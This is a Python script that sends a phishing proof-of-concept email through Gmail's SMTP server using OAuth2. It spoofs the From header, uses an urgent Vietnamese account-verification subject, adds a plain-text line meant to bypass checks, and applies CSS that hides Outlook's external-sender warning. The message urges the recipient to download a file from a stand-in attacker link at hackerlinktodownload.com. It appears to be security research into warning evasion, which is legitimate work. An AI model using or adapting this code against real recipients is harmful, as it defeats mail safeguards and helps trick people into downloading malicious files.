import base64
import os.path
import smtplib

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow

# If modifying these scopes, delete the file token.json.
SCOPES = ['https://mail.google.com/']

# user token storage
USER_TOKENS = 'token_hongtest.json'

# application credentials
CREDENTIALS = 'aaa.json'
# CREDENTIALS = 'a.json'


def getToken() -> str:
    creds = None

    # The file token.json stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists(USER_TOKENS):
        creds = Credentials.from_authorized_user_file(USER_TOKENS, SCOPES)
        creds.refresh(Request())
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS, SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open(USER_TOKENS, 'w') as token:
            token.write(creds.to_json())

    return creds.token


def generate_oauth2_string(username, access_token) -> str:
    auth_string = 'user=' + username + '\1auth=Bearer ' + access_token + '\1\1'
    return base64.b64encode(auth_string.encode('ascii')).decode('ascii')


def main():
    host = "smtp.gmail.com"
    port = 587
    sender_email = "hongtest@gmail.com"
    receiver_email = "<long@test.com>"

    access_token = getToken()
    auth_string = generate_oauth2_string(sender_email, access_token)

    message = MIMEMultipart("alternative")
    message["From"] = "\"nonebie\" <test@test.com>:<hongtest@gmail.com>"
    message["To"] = "<long@test.com>"
    message["CC"] = "<lea@test.com>"
    message['Subject'] = "[QUAN TRỌNG] Khẩn cấp Yêu cầu xác minh lại không tin"
    message.attach(MIMEText('Dòng này để bypass kiểm tra', "plain"))
    html = """\
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<style type="text/css">
		.id3 {
			display: block !important;
		}
		div[style] {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		span {
		  display: none !important;
		  background: #FFFFFF !important;
		}
		span[style] {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		table[style] {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		table {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		td {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		td[style] {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		tr {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		tr[style] {
	    display: none !important;
	    background:#FFFFFF !important;
		}
		tbody {
	    background:#FFFFFF !important;
	    display: none !important;
		}
		tbody[style] {
	    display: none !important;
	    background:#FFFFFF !important;
		}
	</style>
</head>
<body>
    <p class="id3"><br>Kính gửi Anh, Chị đây là Email POC gửi từ bên ngoài Gmail đến Outlook đã ẩn cảnh báo thành công!<br>Hãy nhanh chóng truy cập link sau để tải. file://hackerlinktodownload.com/testPOC<br></p>
</body>
</html>
"""
    message.attach(MIMEText(html, 'html'))
    server = smtplib.SMTP(host, port)
    server.set_debuglevel(1)
    server.starttls()
    print(message.as_string())
    server.docmd('AUTH', 'XOAUTH2 ' + auth_string)
    server.sendmail(sender_email, receiver_email, message.as_string())


if __name__ == '__main__':
    main()